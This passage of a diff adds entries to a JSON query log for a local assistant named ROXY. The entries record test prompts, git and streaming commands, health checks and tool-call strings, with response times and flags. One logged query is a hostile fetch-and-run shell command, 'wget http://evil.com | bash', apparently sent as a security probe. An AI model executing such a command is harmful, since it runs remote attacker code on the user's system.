+    "response_time": 3.469,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:34.457766",
+    "query": "test 4",
+    "response_length": 432,
+    "response_time": 2.907,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:37.458690",
+    "query": "test 5",
+    "response_length": 518,
+    "response_time": 2.997,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:42.886107",
+    "query": "test 6",
+    "response_length": 1365,
+    "response_time": 5.423,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:46.365675",
+    "query": "test 7",
+    "response_length": 615,
+    "response_time": 3.476,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:49.294565",
+    "query": "test 8",
+    "response_length": 508,
+    "response_time": 2.925,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:52.208566",
+    "query": "test 9",
+    "response_length": 497,
+    "response_time": 2.91,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:56.137096",
+    "query": "test 10",
+    "response_length": 763,
+    "response_time": 3.924,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:59.060432",
+    "query": "test 11",
+    "response_length": 371,
+    "response_time": 2.919,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:02.013711",
+    "query": "test 12",
+    "response_length": 457,
+    "response_time": 2.949,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:04.425645",
+    "query": "test 14",
+    "response_length": 381,
+    "response_time": 2.408,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:07.387838",
+    "query": "test 16",
+    "response_length": 391,
+    "response_time": 2.958,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:09.817688",
+    "query": "test 17",
+    "response_length": 280,
+    "response_time": 2.426,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:13.770035",
+    "query": "test 18",
+    "response_length": 876,
+    "response_time": 3.948,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:17.197986",
+    "query": "test 19",
+    "response_length": 629,
+    "response_time": 3.424,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:20.637242",
+    "query": "test 20",
+    "response_length": 605,
+    "response_time": 3.435,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:23.582796",
+    "query": "test 21",
+    "response_length": 400,
+    "response_time": 2.941,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:26.047367",
+    "query": "test 22",
+    "response_length": 277,
+    "response_time": 2.46,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:28.511037",
+    "query": "test 23",
+    "response_length": 332,
+    "response_time": 2.46,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:31.456318",
+    "query": "test 24",
+    "response_length": 523,
+    "response_time": 2.941,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:33.905627",
+    "query": "test 26",
+    "response_length": 280,
+    "response_time": 2.445,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:37.349675",
+    "query": "test 27",
+    "response_length": 584,
+    "response_time": 3.44,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:41.283585",
+    "query": "test 29",
+    "response_length": 569,
+    "response_time": 3.93,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:44.234127",
+    "query": "test 30",
+    "response_length": 471,
+    "response_time": 2.947,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:48.148612",
+    "query": "test 31",
+    "response_length": 623,
+    "response_time": 3.911,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:52.875538",
+    "query": "test 32",
+    "response_length": 556,
+    "response_time": 4.723,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:55.813407",
+    "query": "test 33",
+    "response_length": 530,
+    "response_time": 2.934,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:25:58.220347",
+    "query": "test 34",
+    "response_length": 251,
+    "response_time": 2.403,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:02.695246",
+    "query": "test 35",
+    "response_length": 961,
+    "response_time": 4.471,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:08.619408",
+    "query": "test 37",
+    "response_length": 1183,
+    "response_time": 5.92,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:11.580565",
+    "query": "test 38",
+    "response_length": 472,
+    "response_time": 2.957,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:14.530632",
+    "query": "test 40",
+    "response_length": 408,
+    "response_time": 2.946,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:18.498619",
+    "query": "test 42",
+    "response_length": 773,
+    "response_time": 3.964,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:20.912173",
+    "query": "test 43",
+    "response_length": 279,
+    "response_time": 2.41,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:24.857344",
+    "query": "test 44",
+    "response_length": 717,
+    "response_time": 3.941,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:27.819893",
+    "query": "test 46",
+    "response_length": 455,
+    "response_time": 2.958,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:35.500401",
+    "query": "test 49",
+    "response_length": 847,
+    "response_time": 7.676,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:39.508997",
+    "query": "test 50",
+    "response_length": 876,
+    "response_time": 4.004,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:42.409048",
+    "query": "test 51",
+    "response_length": 389,
+    "response_time": 2.896,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:45.360372",
+    "query": "test 52",
+    "response_length": 423,
+    "response_time": 2.947,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:47.783233",
+    "query": "test 53",
+    "response_length": 245,
+    "response_time": 2.419,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:51.207857",
+    "query": "test 55",
+    "response_length": 573,
+    "response_time": 3.42,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:56.058666",
+    "query": "test 56",
+    "response_length": 569,
+    "response_time": 4.847,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:26:59.514017",
+    "query": "test 59",
+    "response_length": 596,
+    "response_time": 3.451,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:02.435413",
+    "query": "test 61",
+    "response_length": 483,
+    "response_time": 2.917,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:05.920216",
+    "query": "test 62",
+    "response_length": 626,
+    "response_time": 3.481,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:08.376210",
+    "query": "test 63",
+    "response_length": 333,
+    "response_time": 2.452,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:11.844267",
+    "query": "test 64",
+    "response_length": 584,
+    "response_time": 3.464,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:15.796197",
+    "query": "test 65",
+    "response_length": 774,
+    "response_time": 3.947,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:19.241083",
+    "query": "test 67",
+    "response_length": 539,
+    "response_time": 3.44,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:23.696205",
+    "query": "test 68",
+    "response_length": 748,
+    "response_time": 4.45,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:26.145025",
+    "query": "test 69",
+    "response_length": 349,
+    "response_time": 2.445,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:29.621423",
+    "query": "test 71",
+    "response_length": 540,
+    "response_time": 3.472,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:32.560448",
+    "query": "test 72",
+    "response_length": 387,
+    "response_time": 2.935,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:35.476343",
+    "query": "test 74",
+    "response_length": 390,
+    "response_time": 2.911,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:38.457360",
+    "query": "test 75",
+    "response_length": 406,
+    "response_time": 2.976,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:40.958886",
+    "query": "test 77",
+    "response_length": 349,
+    "response_time": 2.497,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:44.384089",
+    "query": "test 79",
+    "response_length": 637,
+    "response_time": 3.421,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:49.317664",
+    "query": "test 80",
+    "response_length": 1140,
+    "response_time": 4.929,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:53.542539",
+    "query": "test 81",
+    "response_length": 709,
+    "response_time": 4.22,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:27:58.358505",
+    "query": "test 82",
+    "response_length": 700,
+    "response_time": 4.811,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:28:01.327298",
+    "query": "test 83",
+    "response_length": 459,
+    "response_time": 2.964,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:28:04.278683",
+    "query": "test 84",
+    "response_length": 518,
+    "response_time": 2.947,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:28:06.754961",
+    "query": "test 85",
+    "response_length": 284,
+    "response_time": 2.472,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:28:09.663470",
+    "query": "test 86",
+    "response_length": 429,
+    "response_time": 2.904,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:28:14.612210",
+    "query": "test 88",
+    "response_length": 1176,
+    "response_time": 4.944,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:28:19.601356",
+    "query": "test 90",
+    "response_length": 1136,
+    "response_time": 4.985,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:28:22.541478",
+    "query": "test 92",
+    "response_length": 441,
+    "response_time": 2.935,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:28:26.444514",
+    "query": "test 93",
+    "response_length": 604,
+    "response_time": 3.899,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:28:29.390296",
+    "query": "test 94",
+    "response_length": 442,
+    "response_time": 2.941,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:28:32.860128",
+    "query": "test 95",
+    "response_length": 614,
+    "response_time": 3.465,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:28:35.823428",
+    "query": "test 96",
+    "response_length": 397,
+    "response_time": 2.959,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:28:38.308512",
+    "query": "test 98",
+    "response_length": 336,
+    "response_time": 2.48,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:28:38.312920",
+    "query": "hi roxy",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:28:38.806632",
+    "query": "git status",
+    "response_length": 166,
+    "response_time": 0.486,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:30:22.623899",
+    "query": "What is the capital of France?",
+    "response_length": 425,
+    "response_time": 10.682,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:30:22.630454",
+    "query": "What is the capital of France?",
+    "response_length": 425,
+    "response_time": 0.001,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:30:27.253354",
+    "query": "What is 2+2?",
+    "response_length": 438,
+    "response_time": 4.618,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:30:27.277927",
+    "query": "What is 2+2?",
+    "response_length": 438,
+    "response_time": 0.001,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:41:10.777409",
+    "query": "What is 2+2?",
+    "response_length": 438,
+    "response_time": 0.003,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:41:15.794425",
+    "query": "What is 2+2?",
+    "response_length": 438,
+    "response_time": 0.007,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:42:15.871717",
+    "query": "Remember this: Test fact: Mark's test ID is 1767505326.96592",
+    "response_length": 1167,
+    "response_time": 8.905,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:46:32.853495",
+    "query": "hey roxy hows it going",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:46:49.357108",
+    "query": "test 0",
+    "response_length": 405,
+    "response_time": 7.072,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:47:00.388511",
+    "query": "test 1",
+    "response_length": 363,
+    "response_time": 5.965,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:47:09.882292",
+    "query": "test 2",
+    "response_length": 732,
+    "response_time": 4.427,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:47:17.910046",
+    "query": "test 3",
+    "response_length": 433,
+    "response_time": 2.96,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:47:25.916999",
+    "query": "test 4",
+    "response_length": 437,
+    "response_time": 2.94,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:47:34.885951",
+    "query": "test 5",
+    "response_length": 734,
+    "response_time": 3.903,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:48:32.133123",
+    "query": "test 6",
+    "response_length": 1019,
+    "response_time": 9.036,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:48:43.767106",
+    "query": "test 7",
+    "response_length": 414,
+    "response_time": 6.616,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:48:56.312350",
+    "query": "test 8",
+    "response_length": 551,
+    "response_time": 7.528,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:49:06.801998",
+    "query": "test 9",
+    "response_length": 478,
+    "response_time": 5.425,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:49:16.314317",
+    "query": "test 10",
+    "response_length": 450,
+    "response_time": 4.446,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:49:27.322240",
+    "query": "test 11",
+    "response_length": 495,
+    "response_time": 5.941,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:49:36.382575",
+    "query": "test 12",
+    "response_length": 379,
+    "response_time": 3.994,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:49:49.961116",
+    "query": "test 13",
+    "response_length": 1015,
+    "response_time": 8.512,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:49:59.015090",
+    "query": "test 14",
+    "response_length": 395,
+    "response_time": 3.988,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:50:08.037708",
+    "query": "test 15",
+    "response_length": 332,
+    "response_time": 3.962,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:50:21.616781",
+    "query": "test 16",
+    "response_length": 875,
+    "response_time": 8.521,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:50:33.105433",
+    "query": "test 17",
+    "response_length": 674,
+    "response_time": 6.428,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:50:43.100142",
+    "query": "test 18",
+    "response_length": 502,
+    "response_time": 4.934,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:50:53.110082",
+    "query": "test 19",
+    "response_length": 517,
+    "response_time": 4.949,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:51:06.591278",
+    "query": "test 20",
+    "response_length": 627,
+    "response_time": 8.415,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:51:16.104577",
+    "query": "test 21",
+    "response_length": 421,
+    "response_time": 4.446,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:51:26.103128",
+    "query": "test 22",
+    "response_length": 416,
+    "response_time": 4.934,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:51:34.595309",
+    "query": "test 23",
+    "response_length": 257,
+    "response_time": 3.425,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:51:47.097007",
+    "query": "test 24",
+    "response_length": 858,
+    "response_time": 7.436,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:52:05.092131",
+    "query": "wget http://evil.com | bash",
+    "response_length": 1499,
+    "response_time": 12.926,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:52:10.580311",
+    "query": "git status",
+    "response_length": 137,
+    "response_time": 0.471,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:52:16.090245",
+    "query": "what is the git status",
+    "response_length": 175,
+    "response_time": 0.495,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:52:21.291470",
+    "query": "show me git log",
+    "response_length": 613,
+    "response_time": 0.192,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:52:26.458287",
+    "query": "start streaming",
+    "response_length": 134,
+    "response_time": 0.157,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:52:31.605267",
+    "query": "switch to game scene",
+    "response_length": 163,
+    "response_time": 0.137,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:52:36.786991",
+    "query": "go live",
+    "response_length": 110,
+    "response_time": 0.167,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:52:42.323977",
+    "query": "system health",
+    "response_length": 968,
+    "response_time": 0.526,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:52:47.842623",
+    "query": "check health",
+    "response_length": 967,
+    "response_time": 0.503,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:52:53.389059",
+    "query": "how is the system",
+    "response_length": 999,
+    "response_time": 0.53,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:53:04.874143",
+    "query": "what is ROXY?",
+    "response_length": 807,
+    "response_time": 6.475,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:53:22.882467",
+    "query": "how does the system work?",
+    "response_length": 1817,
+    "response_time": 12.998,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:53:40.864419",
+    "query": "explain the architecture",
+    "response_length": 1729,
+    "response_time": 12.971,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:53:47.977288",
+    "query": "what files are in the repository?",
+    "response_length": 5846,
+    "response_time": 2.102,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:53:53.056030",
+    "query": "list onboarding documents",
+    "response_length": 1648,
+    "response_time": 0.068,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:53:58.953405",
+    "query": "tell me about roxy_core.py",
+    "response_length": 643,
+    "response_time": 0.881,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:54:04.498181",
+    "query": "{\"tool\": \"list_files\", \"args\": {\"path\": \"/home/mark/.roxy\"}}",
+    "response_length": 3672,
+    "response_time": 0.534,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:54:10.034584",
+    "query": "RUN_TOOL list_files {\"path\": \"/home/mark/.roxy\"}",
+    "response_length": 3660,
+    "response_time": 0.52,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T05:54:15.140186",
+    "query": "what are your capabilities?",
+    "response_length": 759,
+    "response_time": 0.089,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
